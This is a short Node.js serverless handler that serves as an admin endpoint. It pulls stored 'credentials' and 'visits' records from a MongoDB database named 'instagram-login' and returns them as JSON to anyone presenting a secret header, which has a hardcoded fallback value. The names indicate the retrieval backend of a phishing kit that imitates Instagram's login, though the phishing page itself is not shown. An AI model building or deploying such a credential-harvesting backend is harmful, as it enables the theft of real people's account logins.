const { MongoClient } = require("mongodb");

const ADMIN_SECRET = process.env.ADMIN_SECRET || "securify_admin_2024";

let client = null;

async function getDb() {
  if (!client || !client.topology || !client.topology.isConnected()) {
    client = new MongoClient(process.env.MONGODB_URI, { tls: true, serverSelectionTimeoutMS: 5000 });
    await client.connect();
  }
  return client.db("instagram-login");
}

module.exports = async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, x-admin-secret");

  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "GET") return res.status(405).end();

  // Check secret header
  const secret = req.headers["x-admin-secret"];
  if (secret !== ADMIN_SECRET) {
    return res.status(401).json({ success: false, message: "Unauthorized" });
  }

  try {
    const db = await getDb();

    const [credentials, visits] = await Promise.all([
      db.collection("credentials").find({}).sort({ timestamp: -1 }).limit(200).toArray(),
      db.collection("visits").find({}).sort({ timestamp: -1 }).limit(500).toArray(),
    ]);

    return res.status(200).json({
      success: true,
      credentials,
      visits,
      stats: {
        totalCredentials: credentials.length,
        totalVisits: visits.length,
      },
    });
  } catch (e) {
    console.error(e);
    return res.status(500).json({ success: false, message: "Server error" });
  }
};
